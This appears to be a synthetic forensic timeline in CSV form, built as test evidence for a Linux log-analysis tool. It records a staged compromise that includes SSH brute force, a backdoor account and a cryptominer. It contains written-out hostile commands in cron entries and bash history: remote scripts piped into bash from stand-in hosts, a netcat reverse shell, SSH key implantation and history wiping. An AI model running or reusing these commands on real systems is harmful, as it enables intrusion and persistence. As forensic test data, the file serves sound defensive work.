datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: root ALL=(ALL:ALL) ALL,"{""who"": ""root"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",root ALL=(ALL:ALL) ALL
2026-04-27T10:55:23+00:00,2026-04-27,10:55:23,sudoers,sudo_rule,,,sudo rule: %sudo ALL=(ALL:ALL) ALL,"{""who"": ""%sudo"", ""host"": ""ALL"", ""runas"": ""ALL:ALL"", ""tags"": """", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers""}",%sudo ALL=(ALL:ALL) ALL
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=*/5 * * * * cmd=curl -s http://198.51.100.7/x.sh | bash,"{""schedule"": ""*/5 * * * *"", ""user"": ""root"", ""command"": ""curl -s http://198.51.100.7/x.sh | bash"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",*/5 * * * * root curl -s http://198.51.100.7/x.sh | bash
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,www-data,,cron[www-data] sched=@reboot cmd=/tmp/.cache/agent,"{""schedule"": ""@reboot"", ""user"": ""www-data"", ""command"": ""/tmp/.cache/agent"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",@reboot www-data /tmp/.cache/agent
2026-04-27T10:55:34+00:00,2026-04-27,10:55:34,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/cron.d/sysmaint""}",17 * * * * root cd / && run-parts --report /etc/cron.hourly
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=25 6 * * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ),"{""schedule"": ""25 6 * * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=47 6 * * 7 cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ),"{""schedule"": ""47 6 * * 7"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=52 6 1 * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ),"{""schedule"": ""52 6 1 * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=*/30 * * * * cmd=/home/alice/scripts/sync.sh,"{""schedule"": ""*/30 * * * *"", ""user"": ""alice"", ""command"": ""/home/alice/scripts/sync.sh"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",*/30 * * * * /home/alice/scripts/sync.sh
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=@reboot cmd=-qO- http://example.com/agent.sh | bash,"{""schedule"": ""@reboot"", ""user"": ""alice"", ""command"": ""-qO- http://example.com/agent.sh | bash"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",@reboot wget -qO- http://example.com/agent.sh | bash
2026-04-27T10:55:48+00:00,2026-04-27,10:55:48,systemd,unit_present,,,systemd unit: sysmaint.service ExecStart=/tmp/.cache/helper --daemon,"{""name"": ""sysmaint.service"", ""path"": ""/home/claude/test_evidence/etc/systemd/system/sysmaint.service"", ""exec_start"": [""/tmp/.cache/helper --daemon""], ""exec_start_pre"": [], ""user"": ""root"", ""type"": ""simple"", ""wantedby"": [""multi-user.target""], ""description"": ""System Maintenance Helper""}",
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: cd /tmp,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",cd /tmp
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: wget http://198.51.100.7/x -O agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",wget http://198.51.100.7/x -O agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: chmod +x agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",chmod +x agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: ./agent &,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",./agent &
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: curl -s http://attacker.example/payload.sh | bash,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",curl -s http://attacker.example/payload.sh | bash
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: nc -e /bin/sh 198.51.100.7 4444,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",nc -e /bin/sh 198.51.100.7 4444
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,"claude: echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys","{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}","echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys"
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: crontab -e,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",crontab -e
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: visudo,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",visudo
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: unset HISTFILE,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",unset HISTFILE
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: history -c,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",history -c
2026-09-12T02:00:00+00:00,2026-09-12,02:00:00,maillog,maillog:postfix/smtpd,,web01,connect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:00 web01 postfix/smtpd[8000]: connect from unknown[203.0.113.50]
2026-09-12T02:00:01+00:00,2026-09-12,02:00:01,maillog,maillog:postfix/smtpd,,web01,NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable,"{""program"": ""postfix/smtpd""}",Sep 12 02:00:01 web01 postfix/smtpd[8000]: NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable
2026-09-12T02:00:02+00:00,2026-09-12,02:00:02,maillog,maillog:postfix/smtpd,,web01,disconnect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:02 web01 postfix/smtpd[8000]: disconnect from unknown[203.0.113.50]
2026-09-12T02:30:00+00:00,2026-09-12,02:30:00,syslog,syslog:systemd,,web01,Started Daily apt download activities.,"{""program"": ""systemd""}",Sep 12 02:30:00 web01 systemd[1]: Started Daily apt download activities.
2026-09-12T02:30:01+00:00,2026-09-12,02:30:01,syslog,syslog:systemd,,web01,apt-daily.service: Succeeded.,"{""program"": ""systemd""}",Sep 12 02:30:01 web01 systemd[1]: apt-daily.service: Succeeded.
2026-09-12T03:00:00+00:00,2026-09-12,03:00:00,syslog,syslog:CRON,,web01,(root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )),"{""program"": ""CRON""}",Sep 12 03:00:00 web01 CRON[3001]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
2026-09-12T03:00:01+00:00,2026-09-12,03:00:01,cron,cron:CROND,,web01,(root) CMD (run-parts /etc/cron.hourly),"{""program"": ""CROND""}",Sep 12 03:00:01 web01 CROND[1000]: (root) CMD (run-parts /etc/cron.hourly)
2026-09-12T03:00:01+00:00,2026-09-12,03:00:01,cron,cron:anacron,,web01,Job `cron.daily' started,"{""program"": ""anacron""}",Sep 12 03:00:01 web01 anacron[1001]: Job `cron.daily' started
2026-09-12T03:00:30+00:00,2026-09-12,03:00:30,cron,cron:anacron,,web01,Job `cron.daily' terminated,"{""program"": ""anacron""}",Sep 12 03:00:30 web01 anacron[1001]: Job `cron.daily' terminated
2026-09-12T03:14:01+00:00,2026-09-12,03:14:01,messages,messages:systemd,,web01,Started Session 5 of user alice.,"{""program"": ""systemd""}",Sep 12 03:14:01 web01 systemd[1]: Started Session 5 of user alice.
2026-09-12T03:14:01+00:00,2026-09-12,03:14:01,syslog,syslog:systemd,,web01,Starting Cleanup of Temporary Directories...,"{""program"": ""systemd""}",Sep 12 03:14:01 web01 systemd[1]: Starting Cleanup of Temporary Directories...
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,messages,messages:kernel,,web01,usb 1-1: new high-speed USB device number 4 using xhci_hcd,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: usb 1-1: new high-speed USB device number 4 using xhci_hcd
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,messages,messages:kernel,,web01,usb-storage 1-1:1.0: USB Mass Storage device detected,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    0.000000] Linux version 5.15.0-91-generic,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    0.000000] Linux version 5.15.0-91-generic
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    1.234567] usb 1-1: new high-speed USB device number 4 using xhci_hcd,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    1.234567] usb 1-1: new high-speed USB device number 4 using xhci_hcd
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected
2026-09-12T03:20:11+00:00,2026-09-12,03:20:11,messages,messages:kernel,,web01,Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB,"{""program"": ""kernel""}",Sep 12 03:20:11 web01 kernel: Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB
2026-09-12T03:20:11+00:00,2026-09-12,03:20:11,kern.log,kern.log:kernel,,web01,[ 4567.890] Out of memory: Killed process 12345 (xmrig),"{""program"": ""kernel""}",Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig)
2026-09-12T03:20:12+00:00,2026-09-12,03:20:12,messages,messages:kernel,,web01,oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE),"{""program"": ""kernel""}",Sep 12 03:20:12 web01 kernel: oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE)
2026-09-12T04:00:00+00:00,2026-09-12,04:00:00,kern.log,kern.log:kernel,,web01,"[ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=""bash""","{""program"": ""kernel""}","Sep 12 04:00:00 web01 kernel: [ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=""bash"""
2026-09-12T04:00:01+00:00,2026-09-12,04:00:01,messages,messages:sshd,,web01,Accepted publickey for alice from 192.0.2.10 port 50000 ssh2,"{""program"": ""sshd""}",Sep 12 04:00:01 web01 sshd[8001]: Accepted publickey for alice from 192.0.2.10 port 50000 ssh2
2026-09-12T04:22:11+00:00,2026-09-12,04:22:11,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:11 web01 sshd[20001]: Failed password for invalid user admin from 192.0.2.55 port 33001 ssh2
2026-09-12T04:22:13+00:00,2026-09-12,04:22:13,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:13 web01 sshd[20002]: Failed password for invalid user admin from 192.0.2.55 port 33002 ssh2
2026-09-12T04:22:15+00:00,2026-09-12,04:22:15,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:15 web01 sshd[20003]: Failed password for invalid user admin from 192.0.2.55 port 33003 ssh2
2026-09-12T04:22:17+00:00,2026-09-12,04:22:17,auth.log,ssh_login_failed,root,,SSH login failed: user=root ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:17 web01 sshd[20004]: Failed password for invalid user root from 192.0.2.55 port 33004 ssh2
2026-09-12T04:22:19+00:00,2026-09-12,04:22:19,auth.log,ssh_login_failed,root,,SSH login failed: user=root ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:19 web01 sshd[20005]: Failed password for invalid user root from 192.0.2.55 port 33005 ssh2
2026-09-12T04:22:21+00:00,2026-09-12,04:22:21,auth.log,ssh_login_failed,oracle,,SSH login failed: user=oracle ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:21 web01 sshd[20006]: Failed password for invalid user oracle from 192.0.2.55 port 33006 ssh2
2026-09-12T04:22:23+00:00,2026-09-12,04:22:23,auth.log,ssh_login_failed,oracle,,SSH login failed: user=oracle ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:23 web01 sshd[20007]: Failed password for invalid user oracle from 192.0.2.55 port 33007 ssh2
2026-09-12T04:22:25+00:00,2026-09-12,04:22:25,auth.log,ssh_login_failed,postgres,,SSH login failed: user=postgres ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:25 web01 sshd[20008]: Failed password for invalid user postgres from 192.0.2.55 port 33008 ssh2
2026-09-12T04:22:27+00:00,2026-09-12,04:22:27,auth.log,ssh_login_failed,postgres,,SSH login failed: user=postgres ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:27 web01 sshd[20009]: Failed password for invalid user postgres from 192.0.2.55 port 33009 ssh2
2026-09-12T04:22:29+00:00,2026-09-12,04:22:29,auth.log,ssh_login_failed,test,,SSH login failed: user=test ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:29 web01 sshd[20010]: Failed password for invalid user test from 192.0.2.55 port 33010 ssh2
2026-09-12T04:22:31+00:00,2026-09-12,04:22:31,auth.log,ssh_login_failed,user,,SSH login failed: user=user ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:31 web01 sshd[20011]: Failed password for invalid user user from 192.0.2.55 port 33011 ssh2
2026-09-12T04:22:33+00:00,2026-09-12,04:22:33,auth.log,ssh_login_failed,pi,,SSH login failed: user=pi ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:33 web01 sshd[20012]: Failed password for invalid user pi from 192.0.2.55 port 33012 ssh2
2026-09-12T04:22:35+00:00,2026-09-12,04:22:35,auth.log,ssh_login_failed,nginx,,SSH login failed: user=nginx ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:35 web01 sshd[20013]: Failed password for invalid user nginx from 192.0.2.55 port 33013 ssh2
2026-09-12T04:22:37+00:00,2026-09-12,04:22:37,auth.log,ssh_login_failed,mysql,,SSH login failed: user=mysql ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:37 web01 sshd[20014]: Failed password for invalid user mysql from 192.0.2.55 port 33014 ssh2
2026-09-12T04:22:39+00:00,2026-09-12,04:22:39,auth.log,ssh_login_failed,git,,SSH login failed: user=git ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:39 web01 sshd[20015]: Failed password for invalid user git from 192.0.2.55 port 33015 ssh2
2026-09-12T04:22:41+00:00,2026-09-12,04:22:41,auth.log,ssh_login_failed,ftp,,SSH login failed: user=ftp ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:41 web01 sshd[20016]: Failed password for invalid user ftp from 192.0.2.55 port 33016 ssh2
2026-09-12T04:22:43+00:00,2026-09-12,04:22:43,auth.log,ssh_login_failed,backup,,SSH login failed: user=backup ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:43 web01 sshd[20017]: Failed password for invalid user backup from 192.0.2.55 port 33017 ssh2
2026-09-12T04:22:45+00:00,2026-09-12,04:22:45,auth.log,ssh_login_failed,info,,SSH login failed: user=info ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:45 web01 sshd[20018]: Failed password for invalid user info from 192.0.2.55 port 33018 ssh2
2026-09-12T04:22:47+00:00,2026-09-12,04:22:47,auth.log,ssh_login_failed,mail,,SSH login failed: user=mail ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:47 web01 sshd[20019]: Failed password for invalid user mail from 192.0.2.55 port 33019 ssh2
2026-09-12T04:22:49+00:00,2026-09-12,04:22:49,auth.log,ssh_login_failed,testing,,SSH login failed: user=testing ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:49 web01 sshd[20020]: Failed password for invalid user testing from 192.0.2.55 port 33020 ssh2
2026-09-12T04:22:51+00:00,2026-09-12,04:22:51,auth.log,ssh_login_failed,demo,,SSH login failed: user=demo ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:51 web01 sshd[20021]: Failed password for invalid user demo from 192.0.2.55 port 33021 ssh2
2026-09-12T04:22:53+00:00,2026-09-12,04:22:53,auth.log,ssh_login_failed,guest,,SSH login failed: user=guest ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:53 web01 sshd[20022]: Failed password for invalid user guest from 192.0.2.55 port 33022 ssh2
2026-09-12T04:22:55+00:00,2026-09-12,04:22:55,auth.log,ssh_login_failed,developer,,SSH login failed: user=developer ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:55 web01 sshd[20023]: Failed password for invalid user developer from 192.0.2.55 port 33023 ssh2
2026-09-12T04:22:57+00:00,2026-09-12,04:22:57,auth.log,ssh_login_failed,deploy,,SSH login failed: user=deploy ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:57 web01 sshd[20024]: Failed password for invalid user deploy from 192.0.2.55 port 33024 ssh2
2026-09-12T04:22:59+00:00,2026-09-12,04:22:59,auth.log,ssh_login_failed,www,,SSH login failed: user=www ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:59 web01 sshd[20025]: Failed password for invalid user www from 192.0.2.55 port 33025 ssh2
2026-09-12T04:23:01+00:00,2026-09-12,04:23:01,auth.log,ssh_login_failed,docker,,SSH login failed: user=docker ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:23:01 web01 sshd[20026]: Failed password for invalid user docker from 192.0.2.55 port 33026 ssh2
2026-09-12T04:23:30+00:00,2026-09-12,04:23:30,auth.log,ssh_login_success,alice,,SSH login success: user=alice ip=192.0.2.55 method=password,"{""ip"": ""192.0.2.55"", ""method"": ""password"", ""port"": ""33099""}",Sep 12 04:23:30 web01 sshd[20100]: Accepted password for alice from 192.0.2.55 port 33099 ssh2
2026-09-12T04:24:15+00:00,2026-09-12,04:24:15,auth.log,sudo_command,alice,,sudo: alice -> root: /bin/bash,"{""target"": ""root"", ""command"": ""/bin/bash"", ""tty"": ""pts/0"", ""pwd"": ""/home/alice""}",Sep 12 04:24:15 web01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
2026-09-12T04:25:01+00:00,2026-09-12,04:25:01,auth.log,user_added,svc_backup,,User added: svc_backup,,"Sep 12 04:25:01 web01 useradd[21001]: new user: name=svc_backup, UID=998, GID=998, home=/home/svc_backup, shell=/bin/bash"
2026-09-12T04:25:30+00:00,2026-09-12,04:25:30,auth.log,user_modified,,,usermod: change user 'svc_backup' GID to '27',,Sep 12 04:25:30 web01 usermod[21010]: change user 'svc_backup' GID to '27'
2026-09-12T04:30:01+00:00,2026-09-12,04:30:01,syslog,syslog:systemd,,web01,apt-daily-upgrade.service: Succeeded.,"{""program"": ""systemd""}",Sep 12 04:30:01 web01 systemd[1]: apt-daily-upgrade.service: Succeeded.
2026-09-12T04:30:01+00:00,2026-09-12,04:30:01,cron,cron:CROND,,web01,(root) CMD (curl -s http://198.51.100.7/x.sh | bash),"{""program"": ""CROND""}",Sep 12 04:30:01 web01 CROND[2000]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)
2026-09-12T04:30:11+00:00,2026-09-12,04:30:11,messages,messages:nginx,,web01,"198.51.100.55 - - [12/Sep/2025:04:30:11 +0000] ""GET /admin HTTP/1.1"" 404 162","{""program"": ""nginx""}","Sep 12 04:30:11 web01 nginx[9001]: 198.51.100.55 - - [12/Sep/2025:04:30:11 +0000] ""GET /admin HTTP/1.1"" 404 162"
2026-09-12T04:45:00+00:00,2026-09-12,04:45:00,messages,messages:kernel,,web01,nginx[10000]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:00 web01 kernel: nginx[10000]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:45:30+00:00,2026-09-12,04:45:30,messages,messages:kernel,,web01,nginx[10001]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:30 web01 kernel: nginx[10001]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:45:55+00:00,2026-09-12,04:45:55,messages,messages:kernel,,web01,nginx[10002]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:55 web01 kernel: nginx[10002]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:10+00:00,2026-09-12,04:46:10,messages,messages:kernel,,web01,nginx[10003]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:10 web01 kernel: nginx[10003]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:30+00:00,2026-09-12,04:46:30,messages,messages:kernel,,web01,nginx[10004]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:30 web01 kernel: nginx[10004]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:55+00:00,2026-09-12,04:46:55,messages,messages:kernel,,web01,nginx[10005]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:55 web01 kernel: nginx[10005]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T05:00:01+00:00,2026-09-12,05:00:01,messages,messages:systemd,,web01,Reloading.,"{""program"": ""systemd""}",Sep 12 05:00:01 web01 systemd[1]: Reloading.
2026-09-12T05:01:00+00:00,2026-09-12,05:01:00,auth.log,ssh_login_success,root,,SSH login success: user=root ip=198.51.100.99 method=publickey,"{""ip"": ""198.51.100.99"", ""method"": ""publickey"", ""port"": ""51000""}",Sep 12 05:01:00 web01 sshd[22000]: Accepted publickey for root from 198.51.100.99 port 51000 ssh2: RSA SHA256:XXXXXX
2026-09-12T05:01:00+00:00,2026-09-12,05:01:00,messages,messages:kernel,,web01,"audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx""","{""program"": ""kernel""}","Sep 12 05:01:00 web01 kernel: audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx"""
2026-09-12T05:30:00+00:00,2026-09-12,05:30:00,messages,messages:cron,,web01,(root) CMD (curl -fsSL http://198.51.100.7/c.sh | bash),"{""program"": ""cron""}",Sep 12 05:30:00 web01 cron[2222]: (root) CMD (curl -fsSL http://198.51.100.7/c.sh | bash)
2026-09-12T05:30:10+00:00,2026-09-12,05:30:10,auth.log,password_changed,bob,,Password changed for bob,,Sep 12 05:30:10 web01 passwd[23000]: pam_unix(passwd:chauthtok): password changed for bob
2026-09-12T06:25:01+00:00,2026-09-12,06:25:01,syslog,syslog:CRON,,web01,(root) CMD (/tmp/.x/agent.sh),"{""program"": ""CRON""}",Sep 12 06:25:01 web01 CRON[5000]: (root) CMD (/tmp/.x/agent.sh)
